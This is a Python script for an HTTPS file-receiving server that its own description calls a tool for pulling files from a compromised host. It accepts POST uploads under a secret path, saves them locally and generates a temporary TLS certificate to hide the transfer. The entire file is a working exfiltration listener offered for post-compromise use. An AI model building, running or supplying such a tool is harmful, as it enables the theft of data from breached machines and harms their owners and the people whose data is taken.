import argparse
from http.server import HTTPServer, BaseHTTPRequestHandler
import re
import sys
import ssl
import os
import time

C_RED = "\033[1;31m"
C_RESET = "\033[0m"
C_YELLOW = "\033[1;33m"
C_BLUE = "\033[1;34m"
C_GREEN = "\033[1;32m"
C_WHITE = "\033[1;37m"

class Serv(BaseHTTPRequestHandler):
	
	# Since this is explicity for grabbing files FROM the client,
	# we ignore all GET requests
	def do_GET(self):
		self.send_response(404)
		self.log_message("ERROR: Invalid GET Request.")
		
	def do_POST(self):
	
		# rudimentary (and insecure) way of checking for the verification code.
		reg = re.compile("/" + VERPATH + "/.*")
		if reg.match(self.path):
			
			filename = self.path.split("/")[-1]
			content_length = int(self.headers['Content-Length'])
			body = self.rfile.read(content_length)
			
			self.send_response(200)
			self.end_headers()
			
			# Decoding as utf-8 may cause issues in certain cases? I'll have to check.
			file_contents = body
			with open(filename, "wb") as f:
				f.write(file_contents)
				
			self.log_message("File downloaded successfully and saved locally to " + filename)
			
		# If there's no verification code in the URI, ignore it. Could be someone else being annoying.
		else:
			self.send_response(404)
			self.log_message("ERROR: Request with an invalid verification string.")


parser = argparse.ArgumentParser(description="Custom HTTP Server for rudimentary file downloading from a compromised host.")
parser.add_argument("-l", metavar="ip", nargs="?", help="The IP you want to bind to (Default: 0.0.0.0)")
parser.add_argument("-p", metavar="port", nargs="?", help="The port you want to bind to (Default: 8000)")
parser.add_argument("-v", metavar="verstring", nargs="?", help="The 'verification string' used for rudimentary validation.")
parser.add_argument("--unencrypted", action="store_true", help="Perform file downloads over HTTP instead of HTTPS.")

args = parser.parse_args()

if not args.l:
	LHOST = '0.0.0.0'
else:
	LHOST = args.l
	
if not args.p:
	LPORT = 8000
else:
	LPORT= int(args.p)

if not args.v:
	print(f"[-] ERROR: A verification string must be provided.")
	sys.exit()
else:
	VERPATH = args.v	
	
httpd = HTTPServer((LHOST, LPORT), Serv)
if not args.unencrypted:

	# dynamically generate a temporary server key pair for HTTPS
	os.system("openssl req -new -x509 -keyout server.pem -out server.pem -days 10 -nodes -batch 2>/dev/null")
	time.sleep(2)
	httpd.socket = ssl.wrap_socket(httpd.socket, certfile='./server.pem', server_side=True)


msg = f"{C_GREEN}[+]{C_RESET} Server is up and running. To upload a file, send a POST request with the file contents to "
msg += f"{C_BLUE}http://[Your IP]:{LPORT}/{VERPATH}/{C_YELLOW}foo{C_RESET}, with {C_YELLOW}foo{C_RESET} as your destination "
msg += "filename."
print(msg)
httpd.serve_forever()
				
			
			
